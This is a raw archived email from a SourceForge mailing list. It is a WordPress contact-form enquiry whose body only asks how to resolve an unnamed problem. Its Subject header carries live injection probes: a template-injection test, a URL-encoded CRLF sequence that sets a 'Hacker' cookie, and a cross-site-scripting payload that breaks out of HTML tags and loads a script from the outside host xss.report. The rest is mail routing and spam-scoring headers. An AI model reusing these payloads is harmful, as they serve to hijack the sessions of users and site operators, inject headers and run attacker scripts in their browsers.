Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 2F260B41266
	for <lists+osst-users@lfdr.de>; Wed,  3 Sep 2025 04:34:19 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Cc:Reply-To:From:
	List-Subscribe:List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:
	Subject:MIME-Version:Message-ID:Date:To:Sender:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=ykaNB6U69lFgHgBMoGAGWMUVNNGYGGcC7t3iXJHLUzM=; b=hJzheqdPZI4L6LOSsN54P/1pLX
	9IzaVtq5qD9m0C6Og4C4qv254O607IAm5wDGv0FXvcqzcL5hNtbpNVO6OvlMqXaXmKGkJ3O22YVIB
	pAmpagcA3/uTuEk7mZmD260sNCPP0IR1shV9dFcsQ5YojhjoZSoojr7tGJEJ9n7XJ6Lc=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1utdKE-0003g2-1y
	for lists+osst-users@lfdr.de;
	Wed, 03 Sep 2025 02:34:18 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <wordpress@precisiontimeeurope.com>)
 id 1utdKD-0003fn-0O for osst-users@lists.sourceforge.net;
 Wed, 03 Sep 2025 02:34:17 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Reply-To:From:
 Date:Subject:To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=wuInVV3nEHVaaL85vupJW8+ht2OzTT9BX+vXDGD1wPs=; b=PGO7q/DjbZcu2JBZKIuJLPmEiT
 18YxYIXFbnr7RyqmaQnM3Y5AhbpCOkVXHmOigkwICrd1eW5K3uN85okKLKTfG24hkkdqPN++kou4R
 ilPi8ak6PkzTz4orgt3MfXGfKV09zCLh/uezbE1XflCMtjktgh0rg6hXDcVhMZOCb2eI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Reply-To:From:Date:Subject:To:Sender
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=wuInVV3nEHVaaL85vupJW8+ht2OzTT9BX+vXDGD1wPs=; b=F
 tW+emAzbhJ1B/tandH209827lK1xnA6X6QHsEj1VxRqow9dGcj9cENK962o/QCtV8ufwxyPDrjZcA
 RFVhSGFenLJUDjQaGJH9BccDcJTKwyMaoSeyyo6Byy8RWc9DBmrNcT2nK28nExnkWIDfldpdc9lDc
 YepUlMK9qBkXwinM=;
Received: from ip062.dnscamaltecd102.com ([178.33.117.62]
 helo=d102.camaltec-services.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1utdKC-0002rD-I9 for osst-users@lists.sourceforge.net;
 Wed, 03 Sep 2025 02:34:16 +0000
Received: from d102.camaltec-services.com (localhost.localdomain [127.0.0.1])
 by d102.camaltec-services.com (Postfix) with ESMTP id DFFF83DC6D3A
 for <osst-users@lists.sourceforge.net>; Wed,  3 Sep 2025 04:25:47 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=precisiontimeeurope.com; s=default; t=1756866347;
 bh=wuInVV3nEHVaaL85vupJW8+ht2OzTT9BX+vXDGD1wPs=;
 h=Received:Received:To:Subject:From;
 b=VAUtu41wxLbnNVgjqef/eVLAyiBkP0ebv/1bsRN5ecj4q2I6eMcCBjnUidACkBeSU
 a4+xm2sFK2X5k3F411Hwx6Utfsc6YmcapAeCoM3P0RydHLtdDgKf4+lNDh9tO8HQ8S
 GhSvwvsGWMMjqU0dHYxiW7KxnbrSuIC+JOP0ecxc=
X-Spam-Flag: NO
X-Spam-Score: 0.723
X-Spam-Level: 
X-Spam-Status: No, score=0.723 tagged_above=-9999 required=5
 tests=[BAYES_00=-1.9, DKIM_SIGNED=0.1, DKIM_VALID=-0.1,
 DKIM_VALID_AU=-0.1, DKIM_VALID_EF=-0.1, FREEMAIL_FORGED_REPLYTO=2.095,
 FREEMAIL_REPLYTO_END_DIGIT=0.25, HTML_MESSAGE=0.001,
 HTML_MIME_NO_HTML_TAG=0.377, MIME_HTML_ONLY=0.1, NO_RELAYS=-0.001,
 URIBL_BLOCKED=0.001] autolearn=no autolearn_force=no
Authentication-Results: d102.camaltec-services.com (amavisd-new);
 dkim=pass (1024-bit key) header.d=precisiontimeeurope.com
Received: from d102.camaltec-services.com ([127.0.0.1])
 by d102.camaltec-services.com (d102.camaltec-services.com [127.0.0.1])
 (amavisd-new, port 10024)
 with ESMTP id ORvu9qvMYi7r for <osst-users@lists.sourceforge.net>;
 Wed,  3 Sep 2025 04:25:47 +0200 (CEST)
Received: by d102.camaltec-services.com (Postfix, from userid 10592)
 id C0B5E3DC6D36; Wed,  3 Sep 2025 04:25:47 +0200 (CEST)
To: osst-users@lists.sourceforge.net
Date: Wed, 3 Sep 2025 02:25:47 +0000
Message-ID: <zl9bmdHJglQFmcSjftquuhANXS9zKEsx9vw11Qiy3KY@www.precisiontimeeurope.com>
X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
X-Spam-Score: 3.3 (+++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Name: Email: Can you tell me how to resolve? 
 Content analysis details:   (3.3 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in digit
 [maheemahee4124(at)gmail.com]
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
 2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
X-Headers-End: 1utdKC-0002rD-I9
Subject: [Osst-users] test-${{6*6}}
 %250d%250aSet-cookie%3A%2520Hacker%2520%3D%2520--%3E%3C%2FtiTle%3E%3C%2FstYle%3E%3C%2FtexTarea%3E%3C%2FscrIpt%3E%22%2F%2F%27%2F%2F%3E%3CscrIpt%20src%3D%2F%2Fxss.report/c/dirogon%3E%3C%2FscrIpt%3E
 - osst-users@lists.sourceforge.net enquiry
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: WordPress via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: maheemahee4124@gmail.com
Cc: WordPress <wordpress@precisiontimeeurope.com>
Content-Type: multipart/mixed; boundary="===============3977780554572519737=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============3977780554572519737==
Content-Type: text/html; charset=UTF-8

Name: <br/>Email: maheemahee4124@gmail.com<br/>Message: Can you tell me how to resolve?<br/>



--===============3977780554572519737==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3977780554572519737==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============3977780554572519737==--
